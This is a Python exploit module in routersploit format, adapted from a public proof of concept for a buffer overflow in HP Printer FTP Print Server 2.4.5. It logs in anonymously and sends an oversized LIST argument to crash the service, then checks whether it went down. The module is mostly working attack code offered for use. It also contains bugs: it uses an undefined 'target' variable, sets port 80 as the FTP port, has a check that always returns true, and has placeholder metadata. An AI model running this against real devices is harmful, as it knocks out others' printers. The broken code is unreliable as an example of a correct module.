#source: https://www.securityfocus.com/bid/21666/info

#-HP Printers running FTP Print Server are prone to a buffer-overflow vulnerability. This issue occurs because the application fails to boundscheck user-supplied data before copying it into an insufficiently sized buffer. 

#An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial of service.

#!/usr/bin/python

import sys
from ftplib import FTP
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "HP_Printer_FTP_Print_Server_2.4.5-'LIST'_Buffer_Overflow",
        "description": " ### "
                       " ### ",

        "authors": (
            "###",  # vulnerability discovery
            "###",  # routersploit module
        ),

        "references": (
            "",
        ),

        "devices": (
            "Hewlett-Packard, HP_Printer_FTP_Print_Server_2.4.5-'LIST'_Buffer_Overflow"
        ),
    }


    target = OptIP("", "ip IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)")
            print_status( "Copyright (c) Joxean Koret")
            print_status()

            #if len(sys.argv) == 1:
                #print_status( "Usage: %s <target>" % sys.argv[0])
                #sys.exit(0)

            #target = sys.argv[1]

            print_status( " Running attack against " + self.target)

            try:
                ftp = FTP(target)
                try:
                    msg = ftp.login() # Login anonymously
                    print_status(msg)
                    
                    buf = "./A"
                    iMax = 9

                    for i in range(iMax):
                        buf += buf

                    print_status( " Sending buffer of",len(buf[0:3000]),"byte(s) ... ")
                    
                    try:
                        print_status( " Please, note that sometimes your connection will not be dropped. ")
                        ftp.retrlines("LIST " + buf[0:3000])
                        print_status( " Exploit doesn't work :(")
                        print_status()
                        #sys.exit(0)
                        ftp2 = FTP(self.target)
                        
                        try:
                            msg = ftp2.login()
                            print_status( " No, it doesn't work :( ")
                            print_status()
                            print_status( msg)
                            sys.exit(0)
                        except:
                            print_status( " Yes, it works.")
                            print_error( sys.exc_info()[1])
                    except:
                        print_status( " Apparently exploit works. Verifying ... ")
                        print_error( sys.exc_info()[1])
                except:
                    print_error( "Exploit failed - Error logging anonymously.",sys.exc_info()[1])
                    #sys.exit(0)
                
            except:
                print_error( "Exploit failed - Can't connect to target", target, ".", sys.exc_info()[1])
                #sys.exit(0)
            

            

            

            

            
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
            
    def check(self):
        
        return True
